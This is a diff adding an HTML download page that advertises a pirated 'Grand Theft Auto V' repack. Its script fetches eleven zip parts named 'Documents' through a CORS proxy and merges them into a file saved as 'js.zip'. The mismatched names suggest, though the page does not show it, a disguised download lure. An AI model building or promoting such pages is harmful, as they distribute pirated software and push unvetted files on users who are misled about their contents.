@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Xecured</title>
+    <link rel="shortcut icon" href="/fav.png" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg bg-body-tertiary fixed-top">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="/">Xecured</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+                <ul class="navbar-nav ml-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="/">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/about">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="/contact">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container text-break">
+        <div class="jumbotron last">
+            <h1>Grand Theft Auto V <br>[ Fitgirl Repack ]</h1>
+            <p>The whole file consists of small files ~ 1.9 GB each. Please wait until each file is being downloaded, after download, all the parts will be merged automatically and the final file will be downloaded </p>
+            <button id="joinButton" onclick="joinFiles()" class="btn">Download</button>
+            <div id="progress-bars-container"></div>
+        </div>
+
+        <div class="fixed-bottom ftr">
+            <footer style="text-align: center;">&copy; 2023 Xecured</footer>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+    <script>
+        function joinFiles() {
+            let urls = [
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part1.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part2.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part3.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part4.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part5.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part6.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part7.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part8.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part9.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part10.zip",
+                "https://cros.nexa.workers.dev/https://github.com/xecured/file/releases/download/new/Documents.part11.zip"
+            ];
+
+            let container = document.getElementById('progress-bars-container');
+            container.innerHTML = ''; // Clear previous progress bars
+
+            let promises = urls.map((url, index) => {
+                return new Promise((resolve, reject) => {
+                    let xhr = new XMLHttpRequest();
+                    xhr.open('GET', url, true);
+                    xhr.responseType = 'blob';
+
+                    // Create progress bar elements
+                    let progressBarContainer = document.createElement('div');
+                    progressBarContainer.className = 'progress-bar-container';
+
+                    let fileNameElement = document.createElement('div');
+                    fileNameElement.className = 'file-name';
+                    fileNameElement.innerText = `File ${index + 1}: ${url.substring(url.lastIndexOf('/') + 1)}`;
+
+                    let progressBar = document.createElement('div');
+                    progressBar.className = 'progress-bar';
+                    let progressBarFill = document.createElement('div');
+                    progressBarFill.className = 'progress-bar-fill';
+
+                    let progressBarPercentage = document.createElement('div');
+                    progressBarPercentage.className = 'progress-bar-percentage';
+
+                    progressBar.appendChild(progressBarFill);
+                    progressBar.appendChild(progressBarPercentage); // New line to add the percentage div
+                    progressBarContainer.appendChild(fileNameElement);
+                    progressBarContainer.appendChild(progressBar);
+                    container.appendChild(progressBarContainer);
+
+                    // Track progress
+                    xhr.addEventListener('progress', (event) => {
+                        if (event.lengthComputable) {
+                            let percentComplete = (event.loaded / event.total) * 100;
+                            // Update progress bar UI here
+                            progressBarFill.style.width = percentComplete + '%';
+                            progressBarPercentage.innerText = Math.round(percentComplete) + '%';
+                        }
+                    });
+
+                    // Resolve the promise when the file is successfully fetched
+                    xhr.addEventListener('load', () => {
+                        if (xhr.status === 200) {
+                            resolve(xhr.response);
+                        } else {
+                            reject(`Failed to fetch ${url}`);
+                        }
+                    });
+
+                    // Handle errors
+                    xhr.addEventListener('error', () => {
+                        reject(`Error fetching ${url}`);
+                    });
+
+                    xhr.send();
+                });
+            });
+
+            Promise.all(promises).then(blobs => {
+                let blob = new Blob(blobs, { type: 'application/zip' });
+
+                let url = window.URL.createObjectURL(blob);
+                let a = document.createElement('a');
+                a.href = url;
+                a.download = 'js.zip';
+                document.body.appendChild(a);
+                a.click();
+                URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+
+                // Handle errors appropriately
+            });
+            document.getElementById('joinButton').style.display = 'none';
+setTimeout(() => {
+    document.getElementById('joinButton').style.display = 'none';
+}, 0);
+        }
+    </script>
+
+    <script>
+        document.getElementById('fileInput').addEventListener('change', () => {
+            const fileInput = document.getElementById('fileInput');
+            const fileInputLabel = document.getElementById('fileInputLabel');
+            if (fileInput.files.length > 0) {
+                const fileNames = Array.from(fileInput.files).map(file => file.name).join(', ');
+                fileInputLabel.textContent = fileNames;
+            } else {
+                fileInputLabel.textContent = 'Select split files';
+            }
+        });
+    </script>
+</body>
+</html>
